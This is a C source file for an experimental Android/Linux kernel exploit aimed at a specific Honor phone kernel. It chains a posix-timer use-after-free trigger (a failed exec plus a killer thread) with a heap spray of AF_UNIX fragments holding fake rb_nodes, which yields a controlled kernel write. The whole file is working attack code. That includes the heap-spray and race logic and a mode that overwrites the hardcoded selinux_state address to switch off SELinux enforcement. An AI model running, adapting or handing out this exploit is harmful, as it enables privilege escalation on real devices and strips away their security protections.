/*
 * merged_98260_64560.c —CVE-2026-98260 trigger + CVE-2026-64560 post-UAF
 * zero-write/landing primitive, adapted to Honor MLY-AN00 6.12.58.
 *
 * This is an EXPERIMENTAL MERGE PROTOTYPE. It is not device-validated.
 *
 * Design (see merge/98260-64560/README.md):
 *   - Trigger side: CVE-2026-98260 (non-leader exec fails after de_thread;
 *     killer SIGKILLs the new leader when the old TID becomes unresolvable).
 *     This part is modeled on port/98260-honor-61258/src/exploit-android-perf.c.
 *   - Post-UAF side: CVE-2026-64560-public's zero-write/landing engine
 *     (t64560_v36.c, MIT, Copyright (c) 2026 GhostLock/CVE-2026-64560
 *     research contributors), adapted from k_itimer=0x180/it.cpu=0xe0 to
 *     this target's k_itimer=0x100/it.cpu=0x78.
 *
 * Primitive: a stale cpu_timer.node in the zombie's timerqueue is reclaimed
 * by an 8 KiB AF_UNIX fragment containing fake rb_nodes at every 0x100 slot
 * +0x78. When the zombie is reaped, rb_erase_cached()'s !child branch writes
 * the controlled "pc" value to the fake node's rb_left target (pc in 0..3
 * => parent NULL => safe zero/one-byte write), and RB_CLEAR_NODE writes the
 * node's own direct-map address back into the fake page (landing oracle).
 *
 * Usage:
 *   merged_98260_64560 [--pc N] [--target HEX] [--attempts N] [--fillers N]
 *                      [--vmas N] [--frag N] [--rcu-ms N]
 *   defaults: pc=0 target=0 attempts=20 fillers=31 vmas=50000 frag=6000
 *
 * Safety: if zombie reaping is unsafe or spray does not land, the process
 * prints STEP_FAIL and returns non-zero; it never kills parked processes.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define CPUCLOCK_SCHED 2
#define KITIMER_BYTES 0x100UL
#define KITIMER_NODE 0x078UL
#define SLOT_STRIDE 0x100UL
#define PAGE_FRAG_SZ 8192UL
#define FILL_BYTE 0x41
#define LOCKERS 3
#define TARGET_STACK (1U << 20)
#define MAX_FRAG 12000
/* MLY-AN00 / 6.12.58 selinux_state link address (from port/98260-honor-61258/
 * src/exploit-android-perf.c: LINK_SELINUX_STATE = 0xffffffc0827e7a60). */
#define LINK_SELINUX_STATE_61258 0xffffffc0827e7a60ULL

struct shared_state {
	atomic_int exec_tid;
	atomic_int go;
	atomic_int stop;
	atomic_int lockers_started;
	atomic_int target_tgid;
	void *base;
	size_t length;
};

static struct shared_state *shared;
static volatile unsigned long long g_pc;
static volatile unsigned long long g_target;
static int g_report_fd = -1;
static int g_gate_fd = -1;

static int g_ring[MAX_FRAG];
static int g_ring_n, g_ring_head, g_ring_cap;

static long tid(void) { return syscall(SYS_gettid); }

static void pin_cpu(int c)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(c % 8, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static int read_posix_slab(int *active, int *total)
{
	FILE *f = fopen("/proc/slabinfo", "re");
	char line[256];
	if (!f) return -1;
	while (fgets(line, sizeof line, f)) {
		if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
			fclose(f);
			return 0;
		}
	}
	fclose(f);
	return -1;
}

static int make_timer(clockid_t cid, timer_t *out)
{
	struct sigevent ev;
	struct itimerspec its;
	memset(&ev, 0, sizeof ev);
	ev.sigev_notify = SIGEV_NONE;
	if (timer_create(cid, &ev, out))
		return -1;
	memset(&its, 0, sizeof its);
	its.it_value.tv_sec = 3600;
	if (timer_settime(*out, 0, &its, NULL)) {
		timer_delete(*out);
		return -1;
	}
	return 0;
}

/* ---- 64560-public landing engine, adapted to 6.12.58 layout ---- */
static void build_fragment(unsigned char *p, size_t len)
{
	memset(p, FILL_BYTE, len);
	for (size_t slot = 0; slot + SLOT_STRIDE <= len; slot += SLOT_STRIDE) {
		size_t base = slot + KITIMER_NODE;
		if (base + 0x30 > len) break;
		*(unsigned long long *)(p + base + 0x00) = g_pc;
		*(unsigned long long *)(p + base + 0x08) = 0;
		*(unsigned long long *)(p + base + 0x10) = g_target;
		*(unsigned long long *)(p + base + 0x18) = 0;
		*(unsigned long long *)(p + base + 0x20) = 0;
		*(unsigned long long *)(p + base + 0x28) = 0;
	}
}

static int frag_spray(int n, const unsigned char *buf)
{
	int ok = 0;
	for (int i = 0; i < n; i++) {
		int sv[2];
		if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv))
			break;
		if (send(sv[0], buf, PAGE_FRAG_SZ, MSG_NOSIGNAL) !=
		    (ssize_t)PAGE_FRAG_SZ) {
			close(sv[0]);
			close(sv[1]);
			break;
		}
		close(sv[0]);
		if (g_ring_n == g_ring_cap) {
			close(g_ring[g_ring_head]);
			g_ring[g_ring_head] = sv[1];
			g_ring_head = (g_ring_head + 1) % g_ring_cap;
		} else {
			g_ring[(g_ring_head + g_ring_n) % g_ring_cap] = sv[1];
			g_ring_n++;
		}
		ok++;
	}
	return ok;
}

static void frag_trim_all(void)
{
	for (int i = 0; i < g_ring_n; i++) close(g_ring[i]);
	g_ring_n = g_ring_head = 0;
}

/* ---- 98260 trigger side (modeled on the early upstream port) ---- */
static int prepare_vmas(unsigned int vmas)
{
	long page = sysconf(_SC_PAGESIZE);
	size_t length;
	void *base;
	int fd;
	unsigned int i;
	if (page <= 0 || (size_t)vmas > SIZE_MAX / (size_t)page)
		return -1;
	length = (size_t)vmas * (size_t)page;
	fd = (int)syscall(SYS_memfd_create, "merge-vmas", MFD_CLOEXEC);
	if (fd < 0 || ftruncate(fd, page)) {
		if (fd >= 0) close(fd);
		return -1;
	}
	base = mmap(NULL, length, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED) {
		close(fd);
		return -1;
	}
	for (i = 0; i < vmas; i++) {
		void *address = (char *)base + (size_t)i * (size_t)page;
		if (mmap(address, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED,
			 fd, 0) != address) {
			close(fd);
			munmap(base, length);
			return -1;
		}
	}
	close(fd);
	shared->base = base;
	shared->length = length;
	return 0;
}

static void *locker(void *arg)
{
	int index = (int)(intptr_t)arg;
	int protection = PROT_NONE;

	pin_cpu(2 + index);
	while (!atomic_load_explicit(&shared->go, memory_order_acquire)) {
		if (atomic_load_explicit(&shared->stop, memory_order_acquire))
			return NULL;
		sched_yield();
	}
	atomic_fetch_add_explicit(&shared->lockers_started, 1,
				  memory_order_release);
	while (!atomic_load_explicit(&shared->stop, memory_order_acquire)) {
		mprotect(shared->base, shared->length, protection);
		protection = protection == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return NULL;
}

static void *killer(void *arg)
{
	int target_tid, target_tgid;

	(void)arg;
	pin_cpu(1);
	while (!(target_tid = atomic_load_explicit(&shared->exec_tid,
						   memory_order_acquire))) {
		if (atomic_load_explicit(&shared->stop, memory_order_acquire))
			return NULL;
		sched_yield();
	}
	target_tgid = atomic_load_explicit(&shared->target_tgid,
					   memory_order_acquire);
	for (;;) {
		long r = syscall(SYS_tgkill, target_tgid, target_tid, 0);
		if (r < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&shared->stop, memory_order_acquire))
			return NULL;
		sched_yield();
	}
	(void)syscall(SYS_tgkill, target_tgid, target_tgid, SIGKILL);
	atomic_store_explicit(&shared->stop, 1, memory_order_release);
	return NULL;
}

static void *exec_thread(void *arg)
{
	timer_t timer;
	int tid_int;
	(void)arg;
	pin_cpu(1);
	if (make_timer(CLOCK_THREAD_CPUTIME_ID, &timer))
		_exit(120);
	tid_int = (int)tid();
	if (write(g_report_fd, &tid_int, sizeof tid_int) != sizeof tid_int)
		_exit(118);
	atomic_store_explicit(&shared->exec_tid, tid_int, memory_order_release);
	atomic_store_explicit(&shared->go, 1, memory_order_release);
	while (atomic_load_explicit(&shared->lockers_started,
				    memory_order_acquire) < LOCKERS)
		sched_yield();
	char *const argv[] = { (char *)"merged", (char *)"--merged-victim", NULL };
	char *const envp[] = { NULL };
	execve("/proc/self/exe", argv, envp);
	_exit(122);
}

static void run_victim_child(int gate_fd, int report_fd, unsigned int vmas)
{
	pthread_t th;
	pin_cpu(1);
	shared->target_tgid = (int)getpid();
	g_report_fd = report_fd;
	g_gate_fd = gate_fd;
	if (prepare_vmas(vmas))
		_exit(110);
	for (int i = 0; i < LOCKERS; i++)
		if (pthread_create(&th, NULL, locker, (void *)(intptr_t)i))
			_exit(111);
	if (pthread_create(&th, NULL, killer, NULL))
		_exit(112);
	if (pthread_create(&th, NULL, exec_thread, NULL))
		_exit(114);
	for (;;) sched_yield();
}

int main(int argc, char **argv)
{
	unsigned int vmas = 50000;
	int attempts = 20, fillers = 31, nfrag = 6000, rcu_ms = 400;
	int selinux_pass = -1;
	int preflight = 0;
	unsigned long long slide = 0;
	int slide_set = 0;
	unsigned char *fbuf;
	int ring_base;

	if (argc > 1 && !strcmp(argv[1], "--merged-victim")) {
		signal(SIGUSR1, SIG_IGN);
		for (;;) pause();
	}

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--pc") && i + 1 < argc)
			g_pc = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--target") && i + 1 < argc)
			g_target = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--attempts") && i + 1 < argc)
			attempts = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--fillers") && i + 1 < argc)
			fillers = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--vmas") && i + 1 < argc)
			vmas = (unsigned int)strtoul(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--frag") && i + 1 < argc)
			nfrag = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--rcu-ms") && i + 1 < argc)
			rcu_ms = atoi(argv[++i]);
		else if (!strcmp(argv[i], "--slide") && i + 1 < argc) {
			slide = strtoull(argv[++i], NULL, 0);
			slide_set = 1;
		} else if (!strcmp(argv[i], "--selinux-pass") && i + 1 < argc) {
			selinux_pass = atoi(argv[++i]);
			if (selinux_pass < 0 || selinux_pass > 1) {
				fprintf(stderr, "selinux-pass must be 0 or 1\n");
				return 2;
			}
		} else if (!strcmp(argv[i], "--preflight")) {
			preflight = 1;
		} else {
			fprintf(stderr,
				"usage: %s [--pc 0..3] [--target HEX] [--attempts N] "
				"[--fillers N] [--vmas N] [--frag N] [--rcu-ms N]\n",
				argv[0]);
			return 2;
		}
	}
	if (g_pc > 3) {
		fprintf(stderr, "pc must be 0..3 (parent must be NULL)\n");
		return 2;
	}
	if (selinux_pass >= 0) {
		if (!slide_set) {
			fprintf(stderr,
				"--selinux-pass requires --slide (from kaslr_slide_61258)\n");
			return 2;
		}
		g_target = LINK_SELINUX_STATE_61258 + slide +
			   (selinux_pass ? 1ULL : 0ULL);
		g_pc = selinux_pass ? 1ULL : 0ULL;
		printf("SELINUX_TARGET pass=%d slide=%#llx target=%#llx pc=%#llx\n",
		       selinux_pass, slide, g_target, g_pc);
	}
	if (fillers < 0 || fillers >= 32) fillers = 31;
	if (nfrag > MAX_FRAG) nfrag = MAX_FRAG;
	g_ring_cap = nfrag + 512;

	shared = mmap(NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
		      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (shared == MAP_FAILED) return 1;
	fbuf = malloc(PAGE_FRAG_SZ);
	if (!fbuf) return 1;
	build_fragment(fbuf, PAGE_FRAG_SZ);
	pin_cpu(1);
	signal(SIGUSR1, SIG_IGN);
	signal(SIGCHLD, SIG_DFL);

	int base_a = -1, base_t = -1;
	read_posix_slab(&base_a, &base_t);
	printf("merged98260_64560 pc=%#llx target=%#llx attempts=%d fillers=%d "
	       "vmas=%u frag=%d rcu_ms=%d baseline=%d/%d selinux_pass=%d\n",
	       g_pc, g_target, attempts, fillers, vmas, nfrag, rcu_ms,
	       base_a, base_t, selinux_pass);
	fflush(stdout);

	if (preflight) {
		timer_t pre[32];
		int n = 0;
		for (int i = 0; i < fillers; i++) {
			if (make_timer(CLOCK_THREAD_CPUTIME_ID, &pre[i]))
				break;
			n++;
		}
		int pa = -1, pt = -1;
		read_posix_slab(&pa, &pt);
		printf("PREFLIGHT_OK uid=%d fillers=%d slab=%d/%d "
		       "timer_bytes=0x%lx node=0x%lx page_frag=0x%lx\n",
		       (int)getuid(), n, pa, pt,
		       (unsigned long)KITIMER_BYTES, (unsigned long)KITIMER_NODE,
		       (unsigned long)PAGE_FRAG_SZ);
		for (int i = 0; i < n; i++) timer_delete(pre[i]);
		return 0;
	}

	for (int a = 1; a <= attempts; a++) {
		timer_t filler[32];
		int filler_n = 0;
		int report[2], gate[2];
		pid_t child;
		int tid_int = 0;
		int landed = 0;
		unsigned long long page = 0;
		int pidfd = -1;

		/* Fill the target slab with (32-1) parent-thread timers. */
		for (int i = 0; i < fillers; i++) {
			if (make_timer(CLOCK_THREAD_CPUTIME_ID, &filler[i]))
				break;
			filler_n++;
		}
		if (filler_n < fillers) {
			fprintf(stderr, "attempt %d: only %d fillers\n", a, filler_n);
			for (int i = 0; i < filler_n; i++) timer_delete(filler[i]);
			continue;
		}

		if (pipe2(report, O_CLOEXEC) || pipe2(gate, O_CLOEXEC)) {
			for (int i = 0; i < filler_n; i++) timer_delete(filler[i]);
			continue;
		}
		child = fork();
		if (child < 0) {
			for (int i = 0; i < filler_n; i++) timer_delete(filler[i]);
			continue;
		}
		if (!child) {
			close(report[0]);
			close(gate[1]);
			run_victim_child(gate[0], report[1], vmas);
			_exit(119);
		}
		close(report[1]);
		close(gate[0]);
		(void)gate; /* single-phase: child triggers immediately */
		if (read(report[0], &tid_int, sizeof tid_int) != sizeof tid_int) {
			fprintf(stderr, "attempt %d: no exec tid\n", a);
			kill(child, SIGKILL);
			waitpid(child, NULL, 0);
			close(report[0]);
			close(gate[1]);
			for (int i = 0; i < filler_n; i++) timer_delete(filler[i]);
			continue;
		}
		close(report[0]);
		close(gate[1]);

		/* Wait for the exec-failure zombie without reaping it. */
		int zombie = 0;
		for (int poll = 0; poll < 600 && !zombie; poll++) {
			siginfo_t info;
			memset(&info, 0, sizeof info);
			if (!waitid(P_PID, (id_t)child, &info,
				    WEXITED | WNOHANG | WNOWAIT) &&
			    info.si_pid == child) {
				zombie = 1;
				break;
			}
			if (atomic_load_explicit(&shared->stop, memory_order_acquire))
				break;
			usleep(100000);
		}
		if (!zombie) {
			printf("attempt=%d no_zombie\n", a);
			kill(child, SIGKILL);
			waitpid(child, NULL, 0);
			for (int i = 0; i < filler_n; i++) timer_delete(filler[i]);
			continue;
		}
		pidfd = child;

		/* Free the 31 filler objects so the slab can leave SLUB and the
		 * stale node page can be reclaimed by the 8 KiB UNIX fragment. */
		for (int i = 0; i < filler_n; i++) timer_delete(filler[i]);
		usleep((useconds_t)rcu_ms * 1000);

		ring_base = g_ring_n;
		int got = frag_spray(nfrag, fbuf);

		/* Reap the zombie: expected rb_erase immediate zero-write + RBNODE
		 * self-address landing in the fake page. */
		waitpid(pidfd, NULL, 0);

		for (int i = ring_base; i < g_ring_n && !landed; i++) {
			unsigned char back[PAGE_FRAG_SZ];
			ssize_t n = recv(g_ring[i], back, sizeof back,
					 MSG_PEEK | MSG_DONTWAIT);
			if (n != (ssize_t)sizeof back)
				continue;
			for (size_t off = 0; off + 8 <= sizeof back; off += 8) {
				if (memcmp(back + off, fbuf + off, 8) == 0)
					continue;
				unsigned long long v;
				memcpy(&v, back + off, sizeof v);
				if ((v & 0x1fffULL) != (unsigned long long)off)
					continue;
				if ((off % SLOT_STRIDE) != KITIMER_NODE)
					continue;
				printf("  LANDED attempt=%d off=%#zx val=%#llx\n",
				       a, off, v);
				page = v & ~0x1fffULL;
				landed = 1;
				break;
			}
		}
		frag_trim_all();
		printf("attempt=%d zombie=1 slab=%d/%d frag=%d landed=%d%s\n",
		       a, base_a, base_t, got, landed,
		       landed ? "" : " (no landing)");
		fflush(stdout);
		if (landed) {
			printf("STEP_OK pc=%#llx target=%#llx attempt=%d page=%#llx\n",
			       g_pc, g_target, a, page);
			if (selinux_pass >= 0) {
				int v = -1;
				FILE *enf = fopen("/sys/fs/selinux/enforce", "r");
				if (enf) {
					if (fscanf(enf, "%d", &v) != 1) v = -1;
					fclose(enf);
				}
				printf("SELINUX_PASS_OK pass=%d target=%#llx enforcing=%s\n",
				       selinux_pass, g_target,
				       v < 0 ? "unknown" : (v ? "Enforcing" : "Permissive"));
			}
			return 0;
		}
	}
	printf("STEP_FAIL pc=%#llx target=%#llx after %d attempts\n",
	       g_pc, g_target, attempts);
	return 1;
}

